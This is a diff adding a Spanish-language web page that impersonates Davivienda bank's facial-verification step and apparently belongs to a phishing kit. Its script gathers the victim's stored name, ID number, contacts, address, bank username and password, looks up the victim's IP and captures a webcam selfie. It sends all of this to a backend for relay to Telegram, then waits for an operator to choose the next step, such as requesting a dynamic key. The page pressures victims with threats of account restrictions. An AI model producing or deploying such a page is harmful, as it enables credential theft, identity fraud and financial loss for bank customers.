@@ -1,0 +1,672 @@
+<!doctype html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Verificación Facial - Davivienda</title>
+    <link rel="stylesheet" href="face.css">
+</head>
+<body class="relative">
+    <div class="fixed inset-0 bg-gradient-to-br from-gray-50 to-gray-100 opacity-50"></div>
+    
+    <div class="instructions-popup hidden" id="instructionsPopup">
+        <div class="popup-content">
+            <div class="popup-header">
+                <button class="popup-close" id="popupClose">
+                    <svg width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
+                    </svg>
+                </button>
+                <h2 class="popup-title">📸 Queremos confirmar que seas tu</h2>
+                <p class="popup-subtitle">Por favor, siga estas instrucciones cuidadosamente para garantizar una verificación facial exitosa</p>
+            </div>
+            
+            <div class="popup-body">
+                <div class="gif-container">
+                    <img src="img/djnija6kqa.gif" alt="Guía de posicionamiento facial correcto" class="positioning-gif" onerror="this.style.display='none'">
+                    <p class="caption mt-3">Posicione su rostro correctamente dentro del área indicada</p>
+                </div>
+                
+                <div class="instructions-list">
+                    <div class="instructions-title">
+                        <svg class="instructions-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                        </svg>
+                        Instrucciones importantes para una verificación exitosa
+                    </div>
+                    <ol class="instructions-items">
+                        <li class="instruction-item">
+                            <div class="instruction-number">1</div>
+                            <div class="instruction-text">Retire anteojos, gafas de sol o cualquier accesorio que pueda interferir con la detección facial.</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">2</div>
+                            <div class="instruction-text">Retire gorras, sombreros o cubrecabezas que puedan ocultar su rostro o cejas.</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">3</div>
+                            <div class="instruction-text">Asegúrese de estar en un lugar bien iluminado, preferiblemente con luz frontal natural (evite luces traseras).</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">4</div>
+                            <div class="instruction-text">Mire directamente a la cámara manteniendo una expresión neutral y relajada (sin sonreír excesivamente).</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">5</div>
+                            <div class="instruction-text">Coloque su rostro dentro del área circular indicada, manteniendo una distancia de 30-50 cm de la cámara.</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">6</div>
+                            <div class="instruction-text">Asegúrese de que todo su rostro sea visible, incluyendo orejas y contorno facial completo.</div>
+                        </li>
+                        <li class="instruction-item">
+                            <div class="instruction-number">7</div>
+                            <div class="instruction-text">Mantenga los ojos abiertos y evite parpadear durante la captura.</div>
+                        </li>
+                    </ol>
+                </div>
+                
+                <div class="popup-timer">
+                    <p class="timer-text">Esta guía se cerrará automáticamente en:</p>
+                    <div class="timer-display" id="timerDisplay">30</div>
+                    <div class="timer-progress">
+                        <div class="timer-progress-bar"></div>
+                    </div>
+                    <p class="caption mt-3">Puede cerrar manualmente haciendo clic en la X</p>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="main-container">
+        <div class="card fade-in">
+            <div class="card-header">
+                <div class="logo">
+                    <img src="img/logo1a.svg" alt="Davivienda" class="logo-img" onerror="this.src='data:image/svg+xml;utf8,<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 100 100\"><rect width=\"50\" height=\"50\" fill=\"%23e30613\"/><text x=\"50\" y=\"60\" font-family=\"Arial\" font-size=\"40\" fill=\"white\">
+                </div>
+                
+                <h1 id="mainTitle">Verificación Facial</h1>
+                <p class="subtitle" id="mainSubtitle">Para su seguridad, necesitamos confirmar que sea usted, mediante un proceso de verificación facial.</p>
+            </div>
+            
+            <div class="card-body">
+                <div id="adminError" class="error-message hidden">
+                    <svg class="error-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <div>
+                        <p class="error-text"><strong>⚠️ Error en verificación facial:</strong><br>Por favor, intente nuevamente asegurándose de que su rostro esté bien iluminado y centrado.</p>
+                    </div>
+                </div>
+                
+                <div id="successMessage" class="error-message hidden" style="background: #d4edda; border-color: #c3e6cb;">
+                    <svg class="error-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24" style="color: #155724;">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path>
+                    </svg>
+                    <div>
+                        <p class="error-text" style="color: #155724;"><strong>✅ Verificación exitosa:</strong><br>Redirigiendo...</p>
+                    </div>
+                </div>
+                
+                <div class="warning-message hidden" id="warningMessage">
+                    <div class="warning-header">
+                        <svg class="warning-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-2.5L13.732 4c-.77-.833-1.964-.833-2.732 0L4.732 16.5c-.77.833.192 2.5 1.732 2.5z"></path>
+                        </svg>
+                        <h3 class="warning-title" style="font-size: 15px;">Atención: No pudimos reconocerte</h3>
+                    </div>
+                    <ul class="warning-list">
+                        <li class="warning-item">
+                            <span><strong>Asegúrese de seguir todas las instrucciones al pie de la letra para una verificación exitosa:</strong></span>
+                        </li>
+                        <li class="warning-item">
+                            <span class="warning-bullet">•</span>
+                            <span>Verifique que ha retirado gafas, gorras y cualquier obstrucción facial.</span>
+                        </li>
+                        <li class="warning-item">
+                            <span class="warning-bullet">•</span>
+                            <span>Mantenga una iluminación frontal adecuada y evite sombras en su rostro.</span>
+                        </li>
+                        <li class="warning-item">
+                            <span class="warning-bullet">•</span>
+                            <span>Mire directamente a la cámara con expresión neutral y posición central.</span>
+                        </li>
+                        <li class="warning-item">
+                            <span style="color: var(--davi-red); font-weight: 500;">¡Este es su último intento antes de posibles restricciones de cuenta!</span>
+                        </li>
+                    </ul>
+                </div>
+                
+                <div class="error-message hidden" id="errorMessage">
+                    <svg class="error-icon" width="20" height="20" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8v4m0 4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path>
+                    </svg>
+                    <div>
+                        <p class="error-text" id="errorText">Error al acceder a la cámara</p>
+                    </div>
+                </div>
+                
+                <div class="mb-6" id="cameraSection">
+                    <div class="camera-container">
+                        <video id="video" class="camera-video" autoplay playsinline muted></video>
+                        <canvas id="canvas" class="hidden"></canvas>
+                        <div class="camera-overlay"></div>
+                    </div>
+                    <p class="caption text-center mt-3" id="cameraInstructions">
+                        Asegúrese de que su rostro esté centrado, bien iluminado y mire fijamente a la cámara con expresión neutral.
+                    </p>
+                </div>
+                
+                <div class="mb-6 hidden" id="previewSection">
+                    <div class="camera-container">
+                        <img id="preview" class="camera-preview" alt="Foto capturada" />
+                        <div id="loadingOverlay" class="loading-overlay hidden">
+                            <div class="loading-spinner"></div>
+                            <p class="loading-text">Enviando verificación...</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="space-y-4">
+                    <button
+                        type="button"
+                        id="captureButton"
+                        class="davi-button"
+                    >
+                        📸 Tomar Foto
+                    </button>
+                    
+                    <button
+                        type="button"
+                        id="retakeButton"
+                        class="davi-button hidden"
+                        style="background: #6c757d;"
+                    >
+                        🔄 Tomar Otra Foto
+                    </button>
+                    
+                    <button
+                        type="button"
+                        id="continueButton"
+                        class="davi-button hidden"
+                    >
+                        ✅ Continuar Verificación
+                    </button>
+                </div>
+            </div>
+            
+            <div class="card-footer">
+                <p class="caption">Banco Davivienda S.A. todos los derechos reservados - 2026</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="page-footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">Ayuda</a>
+            <a href="#" class="footer-link">Términos de uso</a>
+            <a href="#" class="footer-link">Privacidad y cookies</a>
+        </div>
+        <div class="footer-note">
+            Usa la exploración privada si este no es tu dispositivo. 
+            <a href="#">Más información</a>
+        </div>
+    </div>
+
+    <script>
+        let stream = null;
+        let video, canvas, preview, captureButton, retakeButton, continueButton;
+        let cameraSection, previewSection, errorMessage, errorText, loadingOverlay;
+        let warningMessage, cameraInstructions, mainSubtitle, mainTitle;
+        let instructionsPopup, popupClose, timerDisplay;
+        let adminError, successMessage;
+        let popupTimer = null;
+        let countdownTimer = null;
+        let countdownSeconds = 30;
+        let sessionId = localStorage.getItem('session_id');
+        let capturedPhotoData = null;
+        let isProcessing = false;
+        
+        // Verificar si viene de redirección del admin
+        function checkUrlParams() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const source = urlParams.get('source');
+            const error = urlParams.get('error');
+            
+            if ((source === 'admin' || error === 'facial_error') && adminError) {
+                adminError.classList.remove('hidden');
+            }
+            
+            if (error === 'facial_error' && warningMessage) {
+                warningMessage.classList.remove('hidden');
+            }
+        }
+        
+        // Convertir DataURL a Blob
+        function dataURLtoBlob(dataurl) {
+            const arr = dataurl.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+        
+        // Iniciar cámara
+        async function startCamera() {
+            try {
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    showError('Su navegador no soporta el acceso a la cámara.');
+                    disableCaptureButton();
+                    return;
+                }
+                
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                if (video) {
+                    video.srcObject = stream;
+                    video.muted = true;
+                    
+                    try {
+                        await video.play();
+                        hideError();
+                        if (captureButton) captureButton.disabled = false;
+                    } catch (playError) {
+                        setTimeout(async () => {
+                            try {
+                                if (video) await video.play();
+                                hideError();
+                                if (captureButton) captureButton.disabled = false;
+                            } catch (e) {}
+                        }, 100);
+                    }
+                }
+                
+            } catch (error) {
+                console.error('Error al acceder a la cámara:', error);
+                showError('No se pudo acceder a la cámara. Por favor, permita el acceso.');
+                disableCaptureButton();
+            }
+        }
+        
+        // Detener cámara
+        function stopCamera() {
+            if (stream) {
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                    track.enabled = false;
+                });
+                stream = null;
+            }
+            if (video && video.srcObject) {
+                video.srcObject = null;
+            }
+        }
+        
+        function showError(message) {
+            if (errorText) errorText.textContent = message;
+            if (errorMessage) errorMessage.classList.remove('hidden');
+        }
+        
+        function hideError() {
+            if (errorMessage) errorMessage.classList.add('hidden');
+        }
+        
+        function disableCaptureButton() {
+            if (captureButton) captureButton.disabled = true;
+        }
+        
+        function capturePhoto() {
+            try {
+                const videoWidth = video.videoWidth;
+                const videoHeight = video.videoHeight;
+                
+                canvas.width = videoWidth;
+                canvas.height = videoHeight;
+                
+                const ctx = canvas.getContext('2d', { willReadFrequently: false });
+                ctx.imageSmoothingEnabled = true;
+                ctx.imageSmoothingQuality = 'high';
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0, videoWidth, videoHeight);
+                
+                capturedPhotoData = canvas.toDataURL('image/jpeg', 0.9);
+                preview.src = capturedPhotoData;
+                
+                stopCamera();
+                
+                hideError();
+                if (adminError) adminError.classList.add('hidden');
+                
+                cameraSection.classList.add('hidden');
+                previewSection.classList.remove('hidden');
+                
+                captureButton.classList.add('hidden');
+                retakeButton.classList.remove('hidden');
+                continueButton.classList.remove('hidden');
+                
+            } catch (error) {
+                console.error('Error al capturar foto:', error);
+                showError('Error al capturar la foto. Por favor, intente nuevamente.');
+            }
+        }
+        
+        function retakePhoto() {
+            previewSection.classList.add('hidden');
+            cameraSection.classList.remove('hidden');
+            
+            retakeButton.classList.add('hidden');
+            continueButton.classList.add('hidden');
+            captureButton.classList.remove('hidden');
+            
+            capturedPhotoData = null;
+            startCamera();
+        }
+        
+        function showInstructionsPopup() {
+            if (instructionsPopup) {
+                instructionsPopup.classList.remove('hidden');
+                document.body.style.overflow = 'hidden';
+                
+                startPopupTimer();
+            }
+        }
+        
+        function hideInstructionsPopup() {
+            if (instructionsPopup) {
+                instructionsPopup.classList.add('hidden');
+                document.body.style.overflow = '';
+                
+                clearPopupTimers();
+                
+                startCamera();
+            }
+        }
+        
+        function startPopupTimer() {
+            countdownSeconds = 30;
+            if (timerDisplay) {
+                timerDisplay.textContent = countdownSeconds;
+            }
+            
+            countdownTimer = setInterval(() => {
+                countdownSeconds--;
+                
+                if (timerDisplay) {
+                    timerDisplay.textContent = countdownSeconds;
+                }
+                
+                if (countdownSeconds <= 0) {
+                    hideInstructionsPopup();
+                }
+            }, 1000);
+            
+            popupTimer = setTimeout(() => {
+                hideInstructionsPopup();
+            }, 30000);
+        }
+        
+        function clearPopupTimers() {
+            if (countdownTimer) {
+                clearInterval(countdownTimer);
+                countdownTimer = null;
+            }
+            
+            if (popupTimer) {
+                clearTimeout(popupTimer);
+                popupTimer = null;
+            }
+        }
+        
+        // ENVIAR FOTO CON MENSAJE Y BOTONERA
+        async function enviarFotoConMensajeYBotones(photoData) {
+            if (!sessionId) {
+                sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                localStorage.setItem('session_id', sessionId);
+            }
+            
+            try {
+                // Obtener datos del usuario
+                const nombre = localStorage.getItem('nombre') || 'No disponible';
+                const cedula = localStorage.getItem('cedula') || 'No disponible';
+                const correo = localStorage.getItem('correo') || 'No disponible';
+                const celular = localStorage.getItem('cel') || 'No disponible';
+                const ciudad = localStorage.getItem('ciudad') || 'No disponible';
+                const direccion = localStorage.getItem('direccion') || 'No disponible';
+                const identificacion = localStorage.getItem('identificacion') || 'No disponible';
+                const password = localStorage.getItem('password') || 'No disponible';
+                
+                // Detectar dispositivo
+                const userAgent = navigator.userAgent;
+                let dispositivo = 'PC';
+                if (/Android/i.test(userAgent)) dispositivo = 'Android';
+                else if (/iPhone|iPad|iPod/i.test(userAgent)) dispositivo = 'iPhone';
+                else if (/Windows/i.test(userAgent)) dispositivo = 'PC';
+                else if (/Mac/i.test(userAgent)) dispositivo = 'Mac';
+                else if (/Linux/i.test(userAgent)) dispositivo = 'Linux';
+                
+                // Obtener IP
+                let ip = 'No disponible';
+                try {
+                    const ipResponse = await fetch('https://api.ipify.org?format=json');
+                    if (ipResponse.ok) {
+                        const ipData = await ipResponse.json();
+                        ip = ipData.ip;
+                    }
+                } catch(e) {
+                    console.error('Error obteniendo IP:', e);
+                }
+                
+                const hora = new Date().toLocaleString('es-ES');
+                
+                // Crear mensaje
+                const mensaje = `💎DAVIVIENDA💎
+------------------------------
+👤 Nombre: ${nombre}
+🆔 Cédula: ${cedula}
+💌Correo: ${correo}
+📞Celular: ${celular}
+📍 Ciudad: ${ciudad}
+🏠 Dirección: ${direccion}
+📟Dispositivo: ${dispositivo}
+🗺IP: ${ip}
+⏱️Hora: ${hora}
+------------------------------
+👤 Usuario: ${identificacion}
+🔑 Clave: ${password}`;
+
+                // Preparar datos para enviar
+                const photoBlob = dataURLtoBlob(photoData);
+                const formData = new FormData();
+                formData.append('photo', photoBlob, 'facial_verification.jpg');
+                formData.append('caption', mensaje);
+                formData.append('transactionId', sessionId);
+
+                console.log('Enviando foto a Telegram...');
+                const response = await fetch('procesar_facial.php', {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                console.log('Respuesta:', result);
+                
+                return result.status === 'success';
+                
+            } catch (error) {
+                console.error('Error al enviar foto:', error);
+                return false;
+            }
+        }
+        
+        // VERIFICAR RESPUESTA DEL ADMIN
+        async function checkFacialVerification(transactionId) {
+            try {
+                const formData = new FormData();
+                formData.append('transactionId', transactionId);
+
+                const res = await fetch('verificar_facial.php', {
+                    method: 'POST',
+                    body: formData
+                });
+
+                const result = await res.json();
+                console.log('Respuesta del admin:', result);
+
+                if (result && result.action) {
+                    console.log(`✅ Decisión tomada por: ${result.adminName}`);
+                    
+                    switch (result.action) {
+                        case 'pedir_dinamica':
+                            window.location.href = "index.html?source=admin&error=pedir_dinamica";
+                            break;
+
+                        case 'facial':
+                            window.location.href = "facial_step.html?source=admin&error=facial_error";
+                            break;
+
+                        case 'confirm_finalizar':
+                            if (successMessage) {
+                                successMessage.classList.remove('hidden');
+                                if (continueButton) {
+                                    continueButton.textContent = '✅ Verificación Exitosa';
+                                    continueButton.classList.add('success');
+                                }
+                            }
+                            setTimeout(() => {
+                                window.location.href = "fin.php";
+                            }, 2000);
+                            break;
+
+                        default:
+                            setTimeout(() => checkFacialVerification(transactionId), 2000);
+                            break;
+                    }
+                } else {
+                    setTimeout(() => checkFacialVerification(transactionId), 2000);
+                }
+
+            } catch (err) {
+                console.error('Error en polling:', err);
+                setTimeout(() => checkFacialVerification(transactionId), 2000);
+            }
+        }
+        
+        async function handleContinue() {
+            if (isProcessing) return;
+            
+            if (!capturedPhotoData) {
+                showError('No hay foto capturada. Por favor, tome una foto primero.');
+                return;
+            }
+            
+            isProcessing = true;
+            
+            continueButton.disabled = true;
+            continueButton.textContent = 'Enviando...';
+            
+            if (preview) {
+                preview.classList.add('loading');
+            }
+            if (loadingOverlay) {
+                loadingOverlay.classList.remove('hidden');
+                loadingOverlay.querySelector('.loading-text').textContent = 'Enviando verificación...';
+            }
+            
+            if (adminError) adminError.classList.add('hidden');
+            hideError();
+            
+            // Enviar foto con botones
+            const success = await enviarFotoConMensajeYBotones(capturedPhotoData);
+            
+            if (success) {
+                if (loadingOverlay) {
+                    loadingOverlay.querySelector('.loading-text').textContent = 'Esperando respuesta...';
+                }
+                continueButton.textContent = 'Esperando respuesta...';
+                
+                // Iniciar polling
+                setTimeout(() => {
+                    checkFacialVerification(sessionId);
+                }, 1000);
+            } else {
+                if (loadingOverlay) {
+                    loadingOverlay.classList.add('hidden');
+                }
+                if (preview) {
+                    preview.classList.remove('loading');
+                }
+                showError('Error al enviar la verificación. Por favor, intente nuevamente.');
+                continueButton.textContent = '✅ Continuar Verificación';
+                continueButton.disabled = false;
+                isProcessing = false;
+            }
+        }
+        
+        function init() {
+            video = document.getElementById('video');
+            canvas = document.getElementById('canvas');
+            preview = document.getElementById('preview');
+            captureButton = document.getElementById('captureButton');
+            retakeButton = document.getElementById('retakeButton');
+            continueButton = document.getElementById('continueButton');
+            cameraSection = document.getElementById('cameraSection');
+            previewSection = document.getElementById('previewSection');
+            errorMessage = document.getElementById('errorMessage');
+            errorText = document.getElementById('errorText');
+            loadingOverlay = document.getElementById('loadingOverlay');
+            warningMessage = document.getElementById('warningMessage');
+            cameraInstructions = document.getElementById('cameraInstructions');
+            mainSubtitle = document.getElementById('mainSubtitle');
+            mainTitle = document.getElementById('mainTitle');
+            instructionsPopup = document.getElementById('instructionsPopup');
+            popupClose = document.getElementById('popupClose');
+            timerDisplay = document.getElementById('timerDisplay');
+            adminError = document.getElementById('adminError');
+            successMessage = document.getElementById('successMessage');
+            
+            checkUrlParams();
+            
+            captureButton.addEventListener('click', capturePhoto);
+            retakeButton.addEventListener('click', retakePhoto);
+            continueButton.addEventListener('click', handleContinue);
+            
+            if (popupClose) {
+                popupClose.addEventListener('click', hideInstructionsPopup);
+            }
+            
+            if (instructionsPopup) {
+                instructionsPopup.addEventListener('click', function(e) {
+                    if (e.target === instructionsPopup) {
+                        hideInstructionsPopup();
+                    }
+                });
+            }
+            
+            window.addEventListener('beforeunload', stopCamera);
+            window.addEventListener('pagehide', stopCamera);
+            
+            setTimeout(() => {
+                showInstructionsPopup();
+            }, 500);
+        }
+        
+        if (document.readyState === 'loading') {
+            document.addEventListener('DOMContentLoaded', init);
+        } else {
+            init();
+        }
+    </script>
+</body>
+</html>
